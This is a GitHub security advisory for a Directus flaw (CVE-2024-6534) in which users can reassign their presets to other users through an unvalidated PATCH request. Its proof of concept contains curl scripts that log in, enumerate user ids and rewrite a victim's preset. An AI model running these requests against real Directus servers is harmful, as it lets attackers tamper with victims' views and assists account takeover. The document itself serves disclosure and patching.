# [M] Directus has an insecure object reference via PATH presets

## Summary
Severity: Medium
Advisory: GHSA-3fff-gqw3-vj86
CVE: CVE-2024-6534
CWE: CWE-639
Ecosystem: npm
CVSS: CVSS:3.1/AV:N/AC:L/PR:L/UI:R/S:C/C:N/I:L/A:N (CVSS_V3)
Published: 2024-08-27
Source: https://github.com/advisories/GHSA-3fff-gqw3-vj86
Type: github-advisory

## Affected
- npm: `directus` — affected >=0 <10.13.2

## Details
### Impact
Directus v10.13.0 allows an authenticated external attacker to modify presets created by the same user to assign them to another user. This is possible because the application only validates the user parameter in the `POST /presets` request but not in the PATCH request. When chained with [CVE-2024-6533](https://github.com/directus/directus/security/advisories/GHSA-9qrm-48qf-r2rw), it could result in account takeover.

This vulnerability occurs because the application only validates the user parameter in the `POST /presets` request but not in the PATCH request.

### PoC
To exploit this vulnerability, we need to do the follow steps using a non-administrative, default role attacker account.

1. Create a preset for a collection.

Store the preset id, or use it if it already exists from `GET /presets`. The following example will use the direct_users preset.

```bash
TARGET_HOST="http://localhost:8055" ATTACKER_EMAIL="malicious@malicious.com" ATTACKER_PASSWORD="123456" root_dir=$(dirname $0) mkdir "${root_dir}/static" curl -s -k -o /dev/null -w "%{http_code}" -X 'POST' "${TARGET_HOST}/auth/login" \ -c "${root_dir}/static/attacker_directus_session_token" \ -H 'Content-Type: application/json' \ -d "{\"email\":\"${ATTACKER_EMAIL}\",\"password\":\"${ATTACKER_PASSWORD}\",\"mode\":\"session\"}" attacker_user_id=$(curl -s -k "${TARGET_HOST}/users/me" \ -b "${root_dir}/static/attacker_directus_session_token" | jq -r ".data.id") # Store all user's id curl -s -k "${TARGET_HOST}/users" \ -b "${root_dir}/static/attacker_directus_session_token" | jq -r ".data[] | select(.id != \"${attacker_user_id}\")" > "${root_dir}/static/users.json"

# Choose the victim user id from the previous request
victim_user_id="4f079119-2478-48c4-bd3a-30fa80c5f265"
users_preset_id=$(curl -s -k -X 'POST' "${TARGET_HOST}/presets" \
  -H 'Content-Type: application/json' \
  -b "${root_dir}/static/attacker_directus_session_token" \
  --data-binary "{\"layout\":\"cards\",\"bookmark\":null,\"role\":null,\"user\":\"${attacker_user_id}\",\"search\":null,\"filter\":null,\"layout_query\":{\"cards\":{\"sort\":[\"email\"]}},\"layout_options\":{\"cards\":{\"icon\":\"account_circle\",\"title\":\"{{tittle}}\",\"subtitle\":\"{{ email }}\",\"size\":4}},\"refresh_interval\":null,\"icon\":\"bookmark\",\"color\":null,\"collection\":\"directus_users\"}"  | jq -r '.data.id')
```

2. Modify the presets via `PATCH /presets/{id}`.

With the malicious configuration and the user ID to which you will assign the preset configuration. The user ID can be obtained from `GET /users`. The following example modifies the title parameter.

```bash
curl -i -s -k -X 'PATCH' "${TARGET_HOST}/presets/${users_preset_id}" \
    -H 'Content-Type: application/json' \
    -b "${root_dir}/static/attacker_directus_session_token" \
    --data-binary "{\"layout\":\"cards\",\"bookmark\":null,\"role\":null,\"user\":\"${victim_user_id}\",\"search\":null,\"filter\":null,\"layout_query\":{\"cards\":{\"sort\":[\"email\"]}},\"layout_options\":{\"cards\":{\"icon\":\"account_circle\",\"title\":\"PoC Assign another users presets\",\"subtitle\":\"fakeemail@fake.com\",\"size\":4}},\"refresh_interval\":null,\"icon\":\"bookmark\",\"color\":null,\"collection\":\"directus_users\"}"
```

Notes:

Each new preset to a specific collection will have an integer consecutive id independent of the user who created it.

The user is the user id of the victim. The server will not validate that we assign a new user to a preset we own.

The app will use the first id preset with the lowest value it finds for a specific user and collection. If we control a preset with an id lower than the current preset id to the same collection of the victim user, we can attack that victim user, or if the victim has not yet defined a preset for that collection, then the preset id could be any value we control. Otherwise, the attacker user must have permission to modify or create the victim presets.

When the victim visits the views of the modified presets, it will be rendered with the new configuration applied.

## References
- https://github.com/directus/directus/security/advisories/GHSA-3fff-gqw3-vj86
- https://nvd.nist.gov/vuln/detail/CVE-2024-6534
- https://directus.io
- https://fluidattacks.com/advisories/capaldi
- https://github.com/directus/directus
